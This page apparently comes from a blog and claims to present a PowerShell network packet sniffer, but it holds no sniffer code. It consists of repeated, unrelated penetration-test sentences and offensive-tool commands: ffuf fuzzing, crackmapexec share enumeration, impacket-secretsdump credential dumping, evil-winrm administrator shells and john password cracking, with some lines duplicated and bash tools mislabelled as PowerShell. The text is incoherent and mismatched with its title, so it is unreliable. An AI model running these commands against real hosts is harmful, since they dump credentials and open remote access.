---
TitleSEO: "Network Packet Sniffer in PowerShell | ZureFX"
TitlePost: "Network Packet Sniffer — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for network packet sniffer. Built for security research and automation."
Keywords: "script, bash, tool, python, powershell"
URL: "https://zurefx.github.io/scripting/script-network-packet-sniffer-148.html"
URL_IMAGES: ""
Date: "2024-06-03"
Tags: "Script, Bash, Tool, Python, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-network-packet-sniffer-148"
Permalink: "/scripting/script-network-packet-sniffer-148.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The service was running without proper input validation, leading to injection vulnerabilities. Lateral movement was facilitated by reusing discovered credentials across services. The target system was identified as running a vulnerable version of the service.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `kerbrute`
- `rpcclient`
- `ffuf`

## Implementation

### Core Logic

Unconstrained delegation was enabled on the compromised machine. The kernel version was outdated and vulnerable to a publicly known exploit.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.100.40.201/FUZZ
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The application stored sensitive credentials in an unencrypted configuration file.

### Helper Functions

The web application was vulnerable to Server-Side Template Injection (SSTI). The target system was identified as running a vulnerable version of the service.

```powershell
feroxbuster -h
```

## Usage

### Basic Usage

Command injection was possible through unsanitized user input in the search functionality. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
crackmapexec smb 10.67.30.233 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.45.37.178
```

### Advanced Options

Weak file permissions allowed modification of critical system files. The service account had excessive permissions assigned in Active Directory. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
evil-winrm -i 10.78.2.175 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.22.205.128 -u administrator -p 'P@ssw0rd!'
```

## Output

### Example Output

The web application was vulnerable to Server-Side Template Injection (SSTI). The kernel version was outdated and vulnerable to a publicly known exploit.

```
[+] Scanning target...
[+] Found 17 results
[+] Done in 16.25s
```
